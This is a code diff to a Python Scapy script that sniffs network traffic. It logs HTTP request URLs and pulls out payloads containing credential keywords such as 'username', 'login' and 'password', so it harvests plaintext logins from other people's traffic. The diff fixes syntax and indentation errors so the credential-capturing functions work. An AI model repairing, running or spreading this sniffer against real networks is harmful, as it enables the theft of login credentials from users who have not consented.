@@ -23,7 +23,7 @@ def sniff(interface):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
-        print(f'[+] HTTP Request >> {url.decode()}')
+        print(f'[+] HTTP Request >> {url}')
 
         loginInfo = get_login_info(packet)
         if loginInfo:
@@ -31,16 +31,16 @@ def process_sniffed_packet(packet):
 
 
 def get_url(packet):
-    return f'{packet[http.HTTPRequest].Host}{packet[http.HTTPRequest].Path}
+    return f'{packet[http.HTTPRequest].Host}{packet[http.HTTPRequest].Path}'
 
 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
-    load = packet[scapy.Raw].load.decode()
-    keywords = ['username', 'uname', 'login', 'user', 'password', 'pass']
-    for word in keywords:
-        if word in load:
-            return load
+        load = packet[scapy.Raw].load.decode()
+        keywords = ['username', 'uname', 'login', 'user', 'password', 'pass']
+        for word in keywords:
+            if word in load:
+                return load
 
     
 def get_arguments():
